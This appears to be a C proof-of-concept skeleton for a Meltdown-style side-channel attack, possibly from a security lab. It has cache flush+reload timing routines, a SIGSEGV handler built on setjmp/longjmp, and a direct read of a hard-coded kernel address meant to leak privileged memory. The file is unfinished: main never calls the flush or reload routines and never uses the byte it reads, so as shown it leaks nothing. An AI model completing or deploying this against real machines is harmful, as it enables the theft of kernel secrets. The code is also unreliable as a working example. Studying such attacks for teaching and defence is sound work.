#include <stdio.h>
#include<signal.h>
#include<stdlib.h>
#include<setjmp.h>
#include<unistd.h>
#include <stdint.h>
#include <emmintrin.h>

#define CACHE_HIT_THRESHOLD 130
#define MARGIN 1024

int array[256*4096];
jmp_buf restore_point;

void handle_segfault(int sig)
{

    printf("Caught signal %d\n", sig);
    signal(SIGSEGV, &handle_segfault);
    longjmp(restore_point, SIGSEGV);

}
void handle_segint(int sig)
{
    printf("Caught interrupt signal %d\n", sig);
    exit(1);
}

void flush()
{
        int i;

        // FLush the array elements that could be cached
        for (i=0; i<256; i++)
                _mm_clflush(&array[i*4096 + MARGIN]);
}

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

void reload()
{
        int i;
        uint64_t start, end;
        // Reload the array and check hits
        for (i=0; i<256; i++)
        {
                start = rdtsc();
                array[i*4096 + MARGIN] = 1;
                end = rdtsc();
                if ((end - start) <= CACHE_HIT_THRESHOLD)
                {
                        printf ("Hit on element array[%d * 4096 ] \n", i);
                }
        }
}

int main()
{

	// Registering Signal handler for SIGSEGV
    signal(SIGSEGV, handle_segfault);

    int fault_code = setjmp(restore_point);
    unsigned long kernel_addr = 0xfb61b000;
    if(fault_code == 0)
    {
        char secret_data = *(char*)kernel_addr;	
	// meltdown(kernel_addr)
    }
    else
    	printf("Process Proceeds Normally\n");

    return 0;
}

